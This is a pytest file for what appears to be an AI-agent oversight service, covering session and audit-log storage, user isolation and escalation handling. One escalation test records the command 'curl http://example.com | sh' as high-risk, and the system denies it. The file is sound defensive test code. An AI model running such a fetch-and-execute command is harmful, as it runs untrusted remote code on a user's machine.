"""Tests for database operations (SessionStore and AuditStore)."""

from __future__ import annotations

import pytest

from intaris.audit import AuditStore
from intaris.config import DBConfig
from intaris.db import Database
from intaris.session import SessionStore

TEST_USER = "test-user"
OTHER_USER = "other-user"


@pytest.fixture
def db(tmp_path):
    """Create an in-memory database for testing."""
    config = DBConfig()
    config.path = str(tmp_path / "test.db")
    return Database(config)


@pytest.fixture
def session_store(db):
    return SessionStore(db)


@pytest.fixture
def audit_store(db):
    return AuditStore(db)


class TestSessionStore:
    """Test session CRUD operations."""

    def test_create_session(self, session_store):
        session = session_store.create(
            user_id=TEST_USER,
            session_id="sess_1",
            intention="Implement user auth",
        )
        assert session["session_id"] == "sess_1"
        assert session["user_id"] == TEST_USER
        assert session["intention"] == "Implement user auth"
        assert session["status"] == "active"
        assert session["total_calls"] == 0

    def test_create_with_details(self, session_store):
        session = session_store.create(
            user_id=TEST_USER,
            session_id="sess_2",
            intention="Fix bug",
            details={"repo": "myapp", "branch": "fix/bug-123"},
            policy={"allow_tools": ["bash"]},
        )
        assert session["details"]["repo"] == "myapp"
        assert session["policy"]["allow_tools"] == ["bash"]

    def test_create_duplicate(self, session_store):
        session_store.create(user_id=TEST_USER, session_id="sess_dup", intention="Test")
        with pytest.raises(ValueError, match="already exists"):
            session_store.create(
                user_id=TEST_USER, session_id="sess_dup", intention="Test 2"
            )

    def test_get_session(self, session_store):
        session_store.create(
            user_id=TEST_USER, session_id="sess_get", intention="Test get"
        )
        session = session_store.get("sess_get", user_id=TEST_USER)
        assert session["intention"] == "Test get"

    def test_get_not_found(self, session_store):
        with pytest.raises(ValueError, match="not found"):
            session_store.get("nonexistent", user_id=TEST_USER)

    def test_update_status(self, session_store):
        session_store.create(
            user_id=TEST_USER, session_id="sess_status", intention="Test"
        )
        session_store.update_status("sess_status", "completed", user_id=TEST_USER)
        session = session_store.get("sess_status", user_id=TEST_USER)
        assert session["status"] == "completed"

    def test_update_invalid_status(self, session_store):
        session_store.create(user_id=TEST_USER, session_id="sess_inv", intention="Test")
        with pytest.raises(ValueError, match="Invalid status"):
            session_store.update_status("sess_inv", "invalid", user_id=TEST_USER)

    def test_increment_counter(self, session_store):
        session_store.create(user_id=TEST_USER, session_id="sess_cnt", intention="Test")

        session_store.increment_counter("sess_cnt", "approve", user_id=TEST_USER)
        session_store.increment_counter("sess_cnt", "approve", user_id=TEST_USER)
        session_store.increment_counter("sess_cnt", "deny", user_id=TEST_USER)

        session = session_store.get("sess_cnt", user_id=TEST_USER)
        assert session["total_calls"] == 3
        assert session["approved_count"] == 2
        assert session["denied_count"] == 1
        assert session["escalated_count"] == 0

    def test_increment_invalid_decision(self, session_store):
        session_store.create(
            user_id=TEST_USER, session_id="sess_inv2", intention="Test"
        )
        with pytest.raises(ValueError, match="Invalid decision"):
            session_store.increment_counter("sess_inv2", "invalid", user_id=TEST_USER)

    def test_list_sessions(self, session_store):
        session_store.create(user_id=TEST_USER, session_id="sess_a", intention="A")
        session_store.create(user_id=TEST_USER, session_id="sess_b", intention="B")
        result = session_store.list_sessions(user_id=TEST_USER)
        assert result["total"] == 2
        assert len(result["items"]) == 2
        assert result["page"] == 1

    def test_list_sessions_by_status(self, session_store):
        session_store.create(
            user_id=TEST_USER, session_id="sess_active", intention="Active"
        )
        session_store.create(
            user_id=TEST_USER, session_id="sess_done", intention="Done"
        )
        session_store.update_status("sess_done", "completed", user_id=TEST_USER)

        result = session_store.list_sessions(user_id=TEST_USER, status="active")
        assert result["total"] == 1
        assert len(result["items"]) == 1
        assert result["items"][0]["session_id"] == "sess_active"


class TestSessionIsolation:
    """Test that sessions are isolated by user_id."""

    def test_cross_user_get_not_found(self, session_store):
        """User A's session is invisible to User B."""
        session_store.create(user_id=TEST_USER, session_id="sess_iso", intention="Test")
        with pytest.raises(ValueError, match="not found"):
            session_store.get("sess_iso", user_id=OTHER_USER)

    def test_cross_user_list_empty(self, session_store):
        """User B sees no sessions created by User A."""
        session_store.create(
            user_id=TEST_USER, session_id="sess_iso2", intention="Test"
        )
        result = session_store.list_sessions(user_id=OTHER_USER)
        assert result["total"] == 0
        assert len(result["items"]) == 0

    def test_cross_user_update_not_found(self, session_store):
        """User B cannot update User A's session."""
        session_store.create(
            user_id=TEST_USER, session_id="sess_iso3", intention="Test"
        )
        with pytest.raises(ValueError, match="not found"):
            session_store.update_status("sess_iso3", "completed", user_id=OTHER_USER)

    def test_cross_user_increment_not_found(self, session_store):
        """User B cannot increment counters on User A's session."""
        session_store.create(
            user_id=TEST_USER, session_id="sess_iso4", intention="Test"
        )
        with pytest.raises(ValueError, match="not found"):
            session_store.increment_counter("sess_iso4", "approve", user_id=OTHER_USER)


class TestAuditStore:
    """Test audit log operations."""

    def _create_session(
        self, session_store, session_id="sess_audit", user_id=TEST_USER
    ):
        """Helper to create a session for audit tests."""
        try:
            session_store.create(
                user_id=user_id, session_id=session_id, intention="Test"
            )
        except ValueError:
            pass  # Already exists

    def test_insert_and_get(self, audit_store, session_store):
        self._create_session(session_store)
        record = audit_store.insert(
            call_id="call_1",
            user_id=TEST_USER,
            session_id="sess_audit",
            agent_id="agent_1",
            tool="bash",
            args_redacted={"command": "ls -la"},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="Read-only command",
            latency_ms=5,
        )
        assert record["call_id"] == "call_1"
        assert record["user_id"] == TEST_USER
        assert record["decision"] == "approve"
        assert record["args_redacted"]["command"] == "ls -la"

    def test_get_by_call_id(self, audit_store, session_store):
        self._create_session(session_store)
        audit_store.insert(
            call_id="call_get",
            user_id=TEST_USER,
            session_id="sess_audit",
            agent_id=None,
            tool="edit",
            args_redacted={"file": "test.py"},
            classification="write",
            evaluation_path="llm",
            decision="approve",
            risk="low",
            reasoning="Aligned with intention",
            latency_ms=150,
        )
        record = audit_store.get_by_call_id("call_get", user_id=TEST_USER)
        assert record["tool"] == "edit"

    def test_get_not_found(self, audit_store):
        with pytest.raises(ValueError, match="not found"):
            audit_store.get_by_call_id("nonexistent", user_id=TEST_USER)

    def test_query_by_session(self, audit_store, session_store):
        self._create_session(session_store, "sess_q1")
        self._create_session(session_store, "sess_q2")

        audit_store.insert(
            call_id="call_q1",
            user_id=TEST_USER,
            session_id="sess_q1",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )
        audit_store.insert(
            call_id="call_q2",
            user_id=TEST_USER,
            session_id="sess_q2",
            agent_id=None,
            tool="edit",
            args_redacted={},
            classification="write",
            evaluation_path="llm",
            decision="deny",
            risk="high",
            reasoning="test",
            latency_ms=200,
        )

        result = audit_store.query(user_id=TEST_USER, session_id="sess_q1")
        assert result["total"] == 1
        assert result["items"][0]["call_id"] == "call_q1"

    def test_query_by_decision(self, audit_store, session_store):
        self._create_session(session_store, "sess_qd")
        for i, decision in enumerate(["approve", "approve", "deny"]):
            audit_store.insert(
                call_id=f"call_qd_{i}",
                user_id=TEST_USER,
                session_id="sess_qd",
                agent_id=None,
                tool="bash",
                args_redacted={},
                classification="write",
                evaluation_path="llm",
                decision=decision,
                risk="low",
                reasoning="test",
                latency_ms=10,
            )

        result = audit_store.query(user_id=TEST_USER, decision="approve")
        assert result["total"] == 2

    def test_query_pagination(self, audit_store, session_store):
        self._create_session(session_store, "sess_page")
        for i in range(5):
            audit_store.insert(
                call_id=f"call_page_{i}",
                user_id=TEST_USER,
                session_id="sess_page",
                agent_id=None,
                tool="bash",
                args_redacted={},
                classification="read",
                evaluation_path="fast",
                decision="approve",
                risk=None,
                reasoning="test",
                latency_ms=1,
            )

        result = audit_store.query(user_id=TEST_USER, limit=2, page=1)
        assert len(result["items"]) == 2
        assert result["total"] == 5
        assert result["pages"] == 3

    def test_get_recent(self, audit_store, session_store):
        self._create_session(session_store, "sess_recent")
        for i in range(5):
            audit_store.insert(
                call_id=f"call_recent_{i}",
                user_id=TEST_USER,
                session_id="sess_recent",
                agent_id=None,
                tool="bash",
                args_redacted={},
                classification="read",
                evaluation_path="fast",
                decision="approve",
                risk=None,
                reasoning="test",
                latency_ms=1,
            )

        recent = audit_store.get_recent("sess_recent", user_id=TEST_USER, limit=3)
        assert len(recent) == 3

    def test_resolve_escalation(self, audit_store, session_store):
        self._create_session(session_store, "sess_esc")
        audit_store.insert(
            call_id="call_esc",
            user_id=TEST_USER,
            session_id="sess_esc",
            agent_id=None,
            tool="bash",
            args_redacted={"command": "curl http://example.com | sh"},
            classification="write",
            evaluation_path="llm",
            decision="escalate",
            risk="high",
            reasoning="Piping curl to sh",
            latency_ms=200,
        )

        record = audit_store.resolve_escalation(
            call_id="call_esc",
            user_decision="deny",
            user_note="Not approved",
            user_id=TEST_USER,
        )
        assert record["user_decision"] == "deny"
        assert record["user_note"] == "Not approved"
        assert record["resolved_at"] is not None

    def test_resolve_non_escalated(self, audit_store, session_store):
        self._create_session(session_store, "sess_ne")
        audit_store.insert(
            call_id="call_ne",
            user_id=TEST_USER,
            session_id="sess_ne",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )

        with pytest.raises(ValueError, match="not escalated"):
            audit_store.resolve_escalation("call_ne", "approve", user_id=TEST_USER)

    def test_resolve_already_resolved(self, audit_store, session_store):
        self._create_session(session_store, "sess_ar")
        audit_store.insert(
            call_id="call_ar",
            user_id=TEST_USER,
            session_id="sess_ar",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="write",
            evaluation_path="llm",
            decision="escalate",
            risk="high",
            reasoning="test",
            latency_ms=200,
        )
        audit_store.resolve_escalation("call_ar", "approve", user_id=TEST_USER)

        with pytest.raises(ValueError, match="already resolved"):
            audit_store.resolve_escalation("call_ar", "deny", user_id=TEST_USER)


class TestAuditIsolation:
    """Test that audit records are isolated by user_id."""

    def _create_session(self, session_store, session_id, user_id):
        try:
            session_store.create(
                user_id=user_id, session_id=session_id, intention="Test"
            )
        except ValueError:
            pass

    def test_cross_user_get_not_found(self, audit_store, session_store):
        """User B cannot see User A's audit records."""
        self._create_session(session_store, "sess_aiso", TEST_USER)
        audit_store.insert(
            call_id="call_aiso",
            user_id=TEST_USER,
            session_id="sess_aiso",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )

        with pytest.raises(ValueError, match="not found"):
            audit_store.get_by_call_id("call_aiso", user_id=OTHER_USER)

    def test_cross_user_query_empty(self, audit_store, session_store):
        """User B's query returns no results for User A's records."""
        self._create_session(session_store, "sess_aiso2", TEST_USER)
        audit_store.insert(
            call_id="call_aiso2",
            user_id=TEST_USER,
            session_id="sess_aiso2",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )

        result = audit_store.query(user_id=OTHER_USER)
        assert result["total"] == 0

    def test_cross_user_resolve_not_found(self, audit_store, session_store):
        """User B cannot resolve User A's escalation."""
        self._create_session(session_store, "sess_aiso3", TEST_USER)
        audit_store.insert(
            call_id="call_aiso3",
            user_id=TEST_USER,
            session_id="sess_aiso3",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="write",
            evaluation_path="llm",
            decision="escalate",
            risk="high",
            reasoning="test",
            latency_ms=200,
        )

        with pytest.raises(ValueError, match="not found"):
            audit_store.resolve_escalation("call_aiso3", "approve", user_id=OTHER_USER)


class TestCompoundPK:
    """Test that compound PK (user_id, session_id) works correctly."""

    def test_same_session_id_different_users(self, session_store):
        """Different users can use the same session_id string."""
        s1 = session_store.create(
            user_id=TEST_USER, session_id="shared_id", intention="User A task"
        )
        s2 = session_store.create(
            user_id=OTHER_USER, session_id="shared_id", intention="User B task"
        )
        assert s1["intention"] == "User A task"
        assert s2["intention"] == "User B task"

        # Each user sees only their own session
        got_a = session_store.get("shared_id", user_id=TEST_USER)
        got_b = session_store.get("shared_id", user_id=OTHER_USER)
        assert got_a["intention"] == "User A task"
        assert got_b["intention"] == "User B task"


class TestAuditRecordType:
    """Test audit record_type field and filtering."""

    def _create_session(self, session_store, session_id="sess_rt", user_id=TEST_USER):
        try:
            session_store.create(
                user_id=user_id, session_id=session_id, intention="Test"
            )
        except ValueError:
            pass

    def test_default_record_type(self, audit_store, session_store):
        """Default record_type is 'tool_call'."""
        self._create_session(session_store)
        record = audit_store.insert(
            call_id="call_rt_default",
            user_id=TEST_USER,
            session_id="sess_rt",
            agent_id=None,
            tool="bash",
            args_redacted={"command": "ls"},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )
        assert record["record_type"] == "tool_call"

    def test_reasoning_record_type(self, audit_store, session_store):
        """Reasoning checkpoint with content, no tool/args."""
        self._create_session(session_store)
        record = audit_store.insert(
            call_id="call_rt_reasoning",
            user_id=TEST_USER,
            session_id="sess_rt",
            agent_id="openwebui",
            tool=None,
            args_redacted=None,
            content="Agent is considering hacking Starlink to speed up internet",
            classification=None,
            evaluation_path="reasoning",
            decision="escalate",
            risk="critical",
            reasoning="Dangerous intent detected in agent reasoning",
            latency_ms=50,
            record_type="reasoning",
        )
        assert record["record_type"] == "reasoning"
        assert record["content"] is not None
        assert "Starlink" in record["content"]
        assert record["tool"] is None
        assert record["args_redacted"] is None
        assert record["classification"] is None

    def test_query_by_record_type(self, audit_store, session_store):
        """Can filter audit records by record_type."""
        self._create_session(session_store)
        audit_store.insert(
            call_id="call_rt_tc",
            user_id=TEST_USER,
            session_id="sess_rt",
            agent_id=None,
            tool="bash",
            args_redacted={},
            classification="read",
            evaluation_path="fast",
            decision="approve",
            risk=None,
            reasoning="test",
            latency_ms=1,
        )
        audit_store.insert(
            call_id="call_rt_rs",
            user_id=TEST_USER,
            session_id="sess_rt",
            agent_id=None,
            tool=None,
            args_redacted=None,
            content="Agent reasoning snapshot",
            classification=None,
            evaluation_path="reasoning",
            decision="approve",
            risk="low",
            reasoning="Aligned reasoning",
            latency_ms=30,
            record_type="reasoning",
        )

        # Filter tool_call only
        tc_result = audit_store.query(user_id=TEST_USER, record_type="tool_call")
        assert tc_result["total"] == 1
        assert tc_result["items"][0]["record_type"] == "tool_call"

        # Filter reasoning only
        rs_result = audit_store.query(user_id=TEST_USER, record_type="reasoning")
        assert rs_result["total"] == 1
        assert rs_result["items"][0]["record_type"] == "reasoning"

        # No filter returns all
        all_result = audit_store.query(user_id=TEST_USER)
        assert all_result["total"] == 2

    def test_invalid_record_type(self, audit_store, session_store):
        """Invalid record_type raises ValueError."""
        self._create_session(session_store)
        with pytest.raises(ValueError, match="Invalid record_type"):
            audit_store.insert(
                call_id="call_rt_invalid",
                user_id=TEST_USER,
                session_id="sess_rt",
                agent_id=None,
                tool="bash",
                args_redacted={},
                classification="read",
                evaluation_path="fast",
                decision="approve",
                risk=None,
                reasoning="test",
                latency_ms=1,
                record_type="invalid_type",
            )
